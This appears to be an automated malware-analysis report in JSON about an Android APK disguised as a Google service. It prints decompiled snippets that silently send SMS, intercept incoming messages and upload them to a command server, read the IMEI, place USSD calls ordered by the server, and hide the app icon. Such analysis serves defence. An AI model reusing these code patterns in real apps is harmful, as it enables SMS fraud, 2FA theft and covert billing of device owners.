@@ -1,0 +1,176 @@
+{
+  "APK信息": {
+    "文件名": "785103ede41ab12a912d2a2baded368a52ad8cf7f0b0d3bf5a0feb8a22974ab7.apk",
+    "sha256": "785103ede41ab12a912d2a2baded368a52ad8cf7f0b0d3bf5a0feb8a22974ab7",
+    "包名": "com.google.media.signer",
+    "应用名": "Google Media Service",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 246.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\media\\signer\\Commander;",
+          "method_signature": "SendSms(String phone, String message, String hash)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager sms = SmsManager.getDefault();\nsms.sendTextMessage(phone, null, message, null, null);",
+          "malicious_code_snippet_context": "              Options.sendSms = true;\n              Options.taskHash = hash;\n              Options.receivNumber = phone;\n>>>             SmsManager sms = SmsManager.getDefault();\n>>>             sms.sendTextMessage(phone, null, message, null, null);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "Commander类的SendSms方法接收外部传入的手机号(phone)、短信内容(message)和哈希值(hash)，在无用户交互的情况下通过SmsManager.sendTextMessage()静默发送短信。参数来源为外部传入（疑似C2服务器下发指令），短信内容和目标号码均由攻击者控制，可被用于短信欺诈、订阅扣费业务或作为银行木马的2FA拦截转发组件。类路径伪装为com.google.media.signer以隐蔽其恶意本质。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\google\\media\\signer\\MessageReceiver;",
+          "method_signature": "if(Options.receivNumber.equals(sms_from)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "JSONObject obj = new JSONObject();\nobj.putOpt(\"imei\", Options.imei);\nobj.putOpt(\"status\", \"response\");\nobj.putOpt(\"response\", String.valueOf(sms_from) + \":\" + body);\nobj.putOpt(\"hash\", Options.taskHash);\nnew MainSocket(\"task\", obj.toString());\nabortBroadcast();",
+          "malicious_code_snippet_context": "                          Options.sendSms = false;\n                          Options.receivNumber = \"\";\n                          try {\n>>>                             JSONObject obj = new JSONObject();\n>>>                             obj.putOpt(\"imei\", Options.imei);\n>>>                             obj.putOpt(\"status\", \"response\");\n>>>                             obj.putOpt(\"response\", String.valueOf(sms_from) + \":\" + body);\n>>>                             obj.putOpt(\"hash\", Options.taskHash);\n>>>                             new MainSocket(\"task\", obj.toString());\n>>>                             Options.taskHash = \"\";\n                          } catch (Exception e2) {\n                              e2.printStackTrace();\n                          }",
+          "behavior_description": "代码在MessageReceiver中拦截特定号码的短信，将短信发送方号码和内容拼接后通过MainSocket上传至C2服务器，随后调用abortBroadcast()终止短信广播，阻止短信到达系统收件箱和用户界面，实现短信拦截与窃取。数据流向：短信广播(sms_from+body)→abortBroadcast()+网络上传至C2。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\media\\signer\\BootReceiver;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\nOptions.imei = telephonyManager.getDeviceId();\ncontext.startService(new Intent(context, SocketService.class));",
+          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          Intent i = new Intent(context, (Class<?>) SocketService.class);\n>>>         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>         Options.imei = telephonyManager.getDeviceId();\n>>>         Options.context = context.getApplicationContext();\n          i.setFlags(268435456);\n          context.startService(i);\n          Intent i2 = new Intent(context, (Class<?>) OS.class);",
+          "behavior_description": "应用在开机自启时，通过 TelephonyManager 获取设备 IMEI 并存储在静态变量 Options.imei 中，随后启动 SocketService 等后台服务，准备将采集到的设备标识等隐私数据上传至远程服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\media\\signer\\MainSocket;",
+          "method_signature": "if(task.getString(0)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (task.getString(0).equals(\"ussd\")) {\n    Options.isUssd = true;\n    Options.taskHash = task.getString(4);\n    Intent i = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:*\" + Uri.encode(task.getString(2)) + Uri.encode(\"#\")));\n    i.addFlags(268435456);\n    Options.context.startActivity(i);\n}",
+          "malicious_code_snippet_context": "                          Commander.SendSms(task.getString(2), task.getString(3), task.getString(5));\n                          return;\n                      }\n>>>                     if (task.getString(0).equals(\"ussd\")) {\n>>>                         Options.isUssd = true;\n>>>                         Options.taskHash = task.getString(4);\n>>>                         Intent i = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:*\" + Uri.encode(task.getString(2)) + Uri.encode(\"#\")));\n>>>                         i.addFlags(268435456);\n>>>                         Options.context.startActivity(i);\n>>>                         return;\n                      }\n                      if (task.getString(0).equals(\"intercept\")) {\n                          if (task.getString(2).equals(\"on\")) {",
+          "behavior_description": "代码从远程C2服务器接收JSON格式任务指令，当任务类型为\"ussd\"时，使用ACTION_CALL（非ACTION_DIAL，无需用户确认）直接发起USSD呼叫。USSD码由C2服务器动态下发，可被用于订阅付费服务、转移话费余额等造成直接经济损失的操作。类路径伪装为com.google.media.signer以规避检测，且通过IMEI匹配实现精准定向控制。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\media\\signer\\Player;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "ComponentName localComponentName = new ComponentName(getApplicationContext().getPackageName(), String.valueOf(getApplicationContext().getPackageName()) + \".Player\");\ngetPackageManager().setComponentEnabledSetting(localComponentName, 2, 1);",
+          "malicious_code_snippet_context": "      @Override // android.app.Activity\n      protected void onCreate(Bundle savedInstanceState) {\n          super.onCreate(savedInstanceState);\n>>>         ComponentName localComponentName = new ComponentName(getApplicationContext().getPackageName(), String.valueOf(getApplicationContext().getPackageName()) + \".Player\");\n>>>         getPackageManager().setComponentEnabledSetting(localComponentName, 2, 1);\n          Intent i = new Intent(this, (Class<?>) SocketService.class);\n          i.setFlags(268435456);\n          startService(i);",
+          "behavior_description": "应用启动后，通过 getPackageManager().setComponentEnabledSetting() 将自身主 Activity（Player）设置为 COMPONENT_ENABLED_STATE_DISABLED（值=2），使应用图标从启动器中隐藏，随后在后台启动 SocketService、OS、SendUserData 等多个服务，实现隐蔽驻留运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
